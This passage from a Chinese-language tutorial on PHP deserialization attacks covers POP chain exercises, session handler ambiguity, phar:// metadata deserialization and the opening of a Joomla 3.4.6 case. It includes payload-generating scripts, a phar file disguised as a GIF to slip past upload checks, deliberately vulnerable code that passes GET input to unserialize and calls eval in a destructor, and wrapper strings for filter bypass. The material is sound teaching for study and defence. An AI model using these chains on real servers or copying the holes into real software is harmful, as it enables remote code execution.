class=\"variable\">$arr</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span> = <span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">func</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1= <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">string1</span>();　　<span class=\"comment\">//把 $mod1赋值为string1类对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;    </span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod2 = <span class=\"string\">&quot;字符串拼接&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">string1</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;str1= <span class=\"keyword\">new</span> <span class=\"title class_\">GetFlag</span>();　　<span class=\"comment\">//把 $str1赋值为GetFlag类对象      </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;    </span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;str1-&gt;<span class=\"title function_ invoke__\">get_flag</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;1&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">GetFlag</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_flag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag:&quot;</span>.<span class=\"string\">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> start_gg;　　<span class=\"comment\">//构造start_gg类对象$b</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$b</span>));　　<span class=\"comment\">//显示输出url编码后的序列化对象</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x09\"><a class=\"markdownIt-Anchor\" href=\"#0x09\">#</a> 0x09</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Modifier &#123;</span><br><span class=\"line\">    protected  $var;</span><br><span class=\"line\">    public function append($value)&#123;</span><br><span class=\"line\">        include($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public function __invoke()&#123;</span><br><span class=\"line\">        $this-&gt;append($this-&gt;var);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Show&#123;</span><br><span class=\"line\">    public $source;</span><br><span class=\"line\">    public $str;</span><br><span class=\"line\">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class=\"line\">        $this-&gt;source = $file;</span><br><span class=\"line\">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        return $this-&gt;str-&gt;source;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;</span><br><span class=\"line\">            echo &quot;hacker&quot;;</span><br><span class=\"line\">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Test&#123;</span><br><span class=\"line\">    public $p;</span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;p = array();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __get($key)&#123;</span><br><span class=\"line\">        $function = $this-&gt;p;</span><br><span class=\"line\">        return $function();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class=\"line\">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    $a=new Show;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Modifier &#123;</span><br><span class=\"line\">    protected  $var = &quot;D://1.txt&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">class Show&#123;</span><br><span class=\"line\">    public $source;</span><br><span class=\"line\">    public $str;</span><br><span class=\"line\">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class=\"line\">        $this-&gt;source = $file;</span><br><span class=\"line\">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">class Test&#123;</span><br><span class=\"line\">    public $p;</span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;p = new Modifier();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">$a = new Show();</span><br><span class=\"line\">$a-&gt;source = $a;</span><br><span class=\"line\">$a-&gt;str = new Test();</span><br><span class=\"line\">echo urlencode(serialize($a));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"php_session-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#php_session-反序列化\">#</a> PHP_session 反序列化</h4>\n<p>当第一次访问网站时，Seesion_start () 函数就会创建一个唯一的 Session ID，并自动通过 HTTP 的响应头，将这个 Session ID 保存到客户端 Cookie 中。同时，也在服务器端创建一个以 Session ID 命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过 HTTP 的请求头将 Cookie 中保存的 Seesion ID 再携带过来，这时 Session_start () 函数就不会再去分配一个新的 Session ID，而是在服务器的硬盘中去寻找和这个 Session ID 同名的 Session 文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>\n<p><strong>session_start 的作用</strong></p>\n<p>当会话自动开始或者通过 session_start () 手动开始的时候， PHP 内部会依据客户端传来的 PHPSESSID 来获取现有的对应的会话数据（即 session 文件）， PHP 会自动反序列化 session 文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为 sess_PHPSESSID (客户端传来的) 的文件。如果客户端未发送 PHPSESSID，则创建一个由 32 个字母组成的 PHPSESSID，并返回 set-cookie。</p>\n<p><strong>Session 存储机制</strong></p>\n<p>PHP 中的 Session 中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler 来进行确定的，默认是以文件的方式存储。存储的文件是以 sess_sessionid 来进行命名的，文件的内容就是 Session 值的序列化之后的内容。</p>\n<p>先来大概了解一下 PHP Session 在 php.ini 中主要存在以下配置项：</p>\n<p>在 PHP 中 Session 有三种序列化的方式，分别是 php，php_serialize，php_binary，不同的引擎所对应的 Session 的存储的方式不同</p>\n<table>\n<thead>\n<tr>\n<th><strong>存储引擎</strong></th>\n<th><strong>存储方式</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>php_binary</td>\n<td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值</td>\n</tr>\n<tr>\n<td>php</td>\n<td>键名 + 竖线 + 经过 serialize () 函数序列处理的值</td>\n</tr>\n<tr>\n<td>php_serialize</td>\n<td>(PHP&gt;5.5.4) 经过 serialize () 函数序列化处理的数组</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username|s:5:&quot;aaaaa&quot;;    //php</span><br><span class=\"line\">\busernames:5:&quot;bbbbb&quot;;    //php_binary,最前面为ASCII中的不可见字符</span><br><span class=\"line\">a:1:&#123;s:8:&quot;username&quot;;s:5:&quot;bbbbb&quot;;&#125;    //php_serialize</span><br></pre></td></tr></table></figure>\n<p><strong>Session 反序列化漏洞</strong></p>\n<p>PHP 在 session 存储和读取时，都会有一个序列化和反序列化的过程，PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，PHP 中的 Session 的实现是没有的问题的，<strong>漏洞主要是由于使用不同的引擎来处理 session 文件造成的</strong>。</p>\n<p>存在对 $_SESSION 变量赋值</p>\n<p>漏洞的主要原因在于不同的引擎对于竖杠’ | ' 的解析产生歧义。</p>\n<p>对于 php_serialize 引擎来说’ | ‘可能只是一个正常的字符；但对于 php 引擎来说’ | ‘就是分隔符，前面是 $_SESSION [‘username’] 的键名 ，后面是 GET 参数经过 serialize 序列化后的值。从而在解析的时候造成了歧义，导致其在解析 Session 文件时直接对’ | ' 后的值进行反序列化处理。</p>\n<h4 id=\"phar伪协议触发php反序列化\"><a class=\"markdownIt-Anchor\" href=\"#phar伪协议触发php反序列化\">#</a> phar 伪协议触发 php 反序列化</h4>\n<p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入 unserialize ()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的 Black Hat 上提出利用 phar 文件会以序列化的形式存储用户自定义的 meta-data 这一特性，拓展了 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。</p>\n<p><strong>phar 介绍和漏洞原理</strong></p>\n<p>phar 就是 php 压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与 file://，php:// 等类似，也是一种流包装器。</p>\n<p><strong>phar 文件有四部分构成</strong>：</p>\n<p><strong>1. a stub</strong></p>\n<p>识别 phar 拓展的标识，格式为：xxx<?php xxx; __HALT_COMPILER();?>，对应的函数 Phar::setStub。前期内容不限，但必须以 __HALT_COMPILER ();?&gt; 结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。</p>\n<p><strong>2. a manifest describing the contents</strong></p>\n<p>phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 meta-data，这是漏洞利用的核心部分。对应函数 Phar::setMetadata— 设置 phar 归档元数据。</p>\n<p><strong>3. the file contents</strong></p>\n<p>被压缩文件的内容。</p>\n<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong></p>\n<p>签名，放在文件末尾。对应函数 Phar :: stopBuffering— 停止缓冲对 Phar 存档的写入请求，并将更改保存到磁盘。</p>\n<p><strong>这里有两个关键点：</strong></p>\n<ol>\n<li>\n<p><strong>文件标识</strong>，必须以 __HALT_COMPILER ();?&gt; 结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者 pdf 文件来绕过一些上传限制</p>\n</li>\n<li>\n<p><strong>反序列化</strong>，phar 存储的 meta-data 信息以序列化方式存储，当文件操作函数通过 phar:// 伪协议解析 phar 文件时，文件内容会被解析成 phar 对象，然后 phar 对象内的 meta-data 会被反序列化。</p>\n</li>\n</ol>\n<p>meta-data 是用 serialize () 生成并保存在 phar 文件中，当内核调用 phar_parse_metadata () 解析 meta-data 数据时，会调用 php_var_unserialize () 对其进行反序列化操作，因此会造成反序列化漏洞。</p>\n<p>而在一些上传点，我们可以更改 phar 的文件头并且修改其后缀名绕过检测，如：test.gif，里面的 meta-data 却是我们提前写入的恶意代码，而且可利用的文件操作函数又很多，所以这是一种不错的绕过 + 执行的方法。</p>\n<p>生成 phar 文件的代码如下：</p>\n<p>phar.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    //反序列化payload构造</span><br><span class=\"line\">    class TestObject &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @unlink(&quot;phar.phar&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //实例一个phar对象供后续操作，后缀名必须为phar</span><br><span class=\"line\">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class=\"line\">    //开始缓冲对phar的写操作 </span><br><span class=\"line\">    $phar-&gt;startBuffering();</span><br><span class=\"line\">    </span><br><span class=\"line\">    //设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾</span><br><span class=\"line\">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); </span><br><span class=\"line\"></span><br><span class=\"line\">    //将反序列化的对象放入该文件中</span><br><span class=\"line\">    $o = new TestObject();</span><br><span class=\"line\">    $o-&gt;data=&#x27;i am bmjoker&#x27;;</span><br><span class=\"line\">    //将自定义的归档元数据meta-data存入manifest</span><br><span class=\"line\">    $phar-&gt;setMetadata($o);</span><br><span class=\"line\"></span><br><span class=\"line\">    //phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span><br><span class=\"line\">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;bmjoker&quot;); </span><br><span class=\"line\">    //停止缓冲对phar的写操作</span><br><span class=\"line\">    $phar-&gt;stopBuffering();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>可以明显的看到 meta-data 是以序列化的形式存储的，有序列化数据必然会有反序列化操作，php 一大部分的文件系统函数在通过 phar:// 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，测试后受影响的函数如下：</p>\n<table>\n<thead>\n<tr>\n<th><em><strong>* 受影响的文件操作函数列表 *</strong></em></th>\n<th>** **</th>\n<th></th>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>fileatime</td>\n<td>filectime</td>\n<td>file_exists</td>\n<td>file_get_contents</td>\n<td>touch</td>\n<td>get_meta_tags</td>\n</tr>\n<tr>\n<td>file_put_contents</td>\n<td>file</td>\n<td>filegroup</td>\n<td>fopen</td>\n<td>hash_file</td>\n<td>get_headers</td>\n</tr>\n<tr>\n<td>fileinode</td>\n<td>filemtime</td>\n<td>fileowner</td>\n<td>fileperms</td>\n<td>md5_file</td>\n<td>getimagesize</td>\n</tr>\n<tr>\n<td>is_dir</td>\n<td>is_executable</td>\n<td>is_file</td>\n<td>is_link</td>\n<td>sha1_file</td>\n<td>getimagesizefromstring</td>\n</tr>\n<tr>\n<td>is_readable</td>\n<td>is_writable</td>\n<td>is_writeable</td>\n<td>parse_ini_file</td>\n<td>hash_update_file</td>\n<td>imageloadfont</td>\n</tr>\n<tr>\n<td>copy</td>\n<td>unlink</td>\n<td>stat</td>\n<td>readfile</td>\n<td>hash_hmac_file</td>\n<td>exif_imagetype</td>\n</tr>\n</tbody>\n</table>\n<p>这些函数里面可以使用 phar 协议，当然还有常用的文件包含的几个函数 include、include_once、requrie、require_once</p>\n<p>对刚才生成的 phar 使用文件操作函数实现反序列化读取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class TestObject&#123;</span><br><span class=\"line\">        function __destruct()&#123;</span><br><span class=\"line\">            echo $this-&gt;data;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $filename =  &quot;phar://phar.phar/test.txt&quot;;</span><br><span class=\"line\">    file_get_contents($filename);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x10\"><a class=\"markdownIt-Anchor\" href=\"#0x10\">#</a> 0x10</h4>\n<p>upload_file.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class=\"line\">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class=\"line\">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class=\"line\">    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class=\"line\">    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class=\"line\">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class=\"line\">        echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>upload_file.html</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form action=&quot;http://127.0.0.1/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>file_un.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class=\"line\">class AnyClass&#123;</span><br><span class=\"line\">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class=\"line\">    function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        eval($this -&gt; output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file_exists($filename);   // 漏洞点</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>upload_file.php 对上传文件的类型，后缀进行了判断，限制为 GIF 文件。而 file_un.php 文件主要使用 file_exists () 判断文件是否存在，并且存在魔术方法__destruct ()。大概思路为首先根据 file_un.php 写一个生成 phar 的 php 文件，当然需要绕过为 gif 的限制，所以需要加 GIF89a，然后我们访问这个 php 文件后，生成了 phar.phar，修改后缀为 gif，上传到服务器，然后利用 file_exists，使用 phar:// 执行代码。</p>\n<p>构造 payload 代码 eval.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class AnyClass&#123;</span><br><span class=\"line\">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class=\"line\">    function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        eval($this -&gt; output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class=\"line\">$phar -&gt; startBuffering();</span><br><span class=\"line\">$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class=\"line\">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class=\"line\">$object = new AnyClass();</span><br><span class=\"line\">$object -&gt; output= &#x27;phpinfo();&#x27;;</span><br><span class=\"line\">$phar -&gt; setMetadata($object);</span><br><span class=\"line\">$phar -&gt; stopBuffering();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>访问 eval.php，会在当前目录生成 phar.phar，然后修改后缀 gif</p>\n<p><strong>漏洞利用条件</strong></p>\n<p>\\1. phar 文件要能够上传到服务器端（如 GET、POST），并且要有 file_exists ()，fopen ()，file_get_contents ()，include () 等文件操作的函数</p>\n<p>\\2. 要有可用的魔术方法作为 &quot;跳板&quot;；</p>\n<p>\\3. 文件操作函数的参数可控，且：，/，phar 等特殊字符没有被过滤。</p>\n<p>虽然某些函数能够支持 phar:// 的协议，但是如果目标服务器没有关闭 phar.readonly 时，就不能正常执行反序列化操作。</p>\n<p><strong>在禁止 phar 开头的情况下的替代方法:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">compress.zlib://phar://phar.phar/test.txt</span><br><span class=\"line\"></span><br><span class=\"line\">compress.bzip2://phar://phar.phar/test.txt </span><br><span class=\"line\"></span><br><span class=\"line\">php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt</span><br></pre></td></tr></table></figure>\n<p>虽然会报 warning，但是还是会执行。</p>\n<h3 id=\"joomla-346反序列化执行\"><a class=\"markdownIt-Anchor\" href=\"#joomla-346反序列化执行\">#</a> Joomla  3.4.6 反序列化执行</h3>\n<p>Joomla 反序列化漏洞的主要原因是：</p>\n<blockquote>\n<p>Joomla 不论账号密码是否正确，都会把登录的用户名和密码，通过序列化的方式存储在 session 表中，再以反序列化的方式读取 session 表中的内容。由于 protected 修饰的变量在序列化的时候，会变成 \\x00 + * + \\x00 + [变量名] 的形式，而 mysql 无法保存 NULL 字节的数据，所以在向 session 表写入的过程中会将 \\x00*\\x00 替换为 \\0\\0\\0 ，同样在读取 session 表中的内容的时候会再次转换，然后进行反序列化。如果在向 session 表存储的过程中构造恶意构造一些 \\0\\0\\0，那么在进行反序列化的时候就会由于字节数对不上，导致 “溢出” ，使得反序列化对象逃逸出来。</p>\n</blockquote>\n<p>如果上面这段没看懂，可以看上面利用章节的对象逃逸，如果还看不懂就退学吧</p>\n<p>尝试使用错误的账号密码登录，查看一下 session 表中的内容：</p>\n<p><img 